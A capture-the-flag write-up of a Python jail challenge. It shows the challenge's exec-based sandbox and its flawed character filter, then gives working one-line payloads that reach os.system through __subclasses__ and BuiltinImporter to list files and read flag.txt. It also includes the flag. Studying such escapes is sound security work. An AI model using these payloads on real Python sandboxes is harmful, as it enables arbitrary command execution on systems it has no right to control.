The challenge provides you with the challenge.py
```python
#!/usr/bin/env python 

blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

security_check = lambda s: any(c in blacklist for c in s) and s.count('_') < 50

def main():
    while True: 
        cmds = input("> ")
        if security_check(cmds):
            print("nope.")
        else:
            exec(cmds, {'__builtins__': None}, {})
    

if __name__ == "__main__":
    main()
```

The "security" lies in disabling the builtins and then allowing code execution.
However, this has proven to be insufficient several times, since you can reimport modules with some tricks and the execute all the python code you were able to execute before.
I found [this](https://stackoverflow.com/a/28100947) code to be especially helpful.

I modified it so it became:
`[klass for klass in ''.__class__.__base__.__subclasses__() if klass.__name__ == "BuiltinImporter"][0].load_module("os").system("ls")`

This, however fails because of the security check. For whatever reason, the securitycheck contains the condition `s.count('_') < 50` and thus adding enough underscores bypasses this restriction, e.g.
`[klass for klass in ''.__class__.__base__.__subclasses__() if klass.__name__ == "BuiltinImporter"][0].load_module("os").system("ls; echo __________________________________________________")`

returns
```
chall.py  flag.txt
__________________________________________________
```
(We already know from the dockerfile that the flag is called flag.txt but whatever)

and to read the flag

`[klass for klass in ''.__class__.__base__.__subclasses__() if klass.__name__ == "BuiltinImporter"][0].load_module("os").system("cat flag.txt; echo __________________________________________________")`

gives us the flag: `UDCTF{pyth0n_NFKC_t0_byp4ss_f1l1t3r}`
